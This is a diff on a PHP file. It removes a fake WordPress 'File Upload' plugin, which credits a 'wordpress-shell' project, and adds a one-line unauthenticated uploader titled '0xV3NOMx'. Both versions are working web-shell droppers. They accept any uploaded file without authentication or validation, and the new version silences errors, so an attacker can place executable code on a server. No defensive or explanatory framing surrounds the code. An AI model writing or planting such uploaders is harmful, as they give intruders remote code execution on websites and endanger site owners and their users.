@@ -1,18 +1,1 @@
-<?php
-    /*
-    Plugin Name: File Upload
-    Plugin URI: https://github.com/Xi4u7
-    Description: Simple File Upload
-    Version: 1.0
-    Author URI: https://github.com/Xi4u7
-    */
-
-// Copied and modified from https://github.com/leonjza/wordpress-shell
-
-echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
-echo '<input type="file" name="file"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
-if( $_POST['_upl'] == "Upload" ) {
-if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>File Uploaded!!<b><br><br>'; }
-else { echo '<b>Fail To Upload File!!!</b><br><br>'; }
-}
-?>
+<title>0xV3NOMx</title><?php error_reporting(0);$saw1 = $_FILES['f']['tmp_name'];$saw2 = $_FILES['f']['name'];echo "<form method='POST' enctype='multipart/form-data'><input type='file'name='f' /><input type='submit' value='up' /></form>";@copy($saw1,$saw2);?>
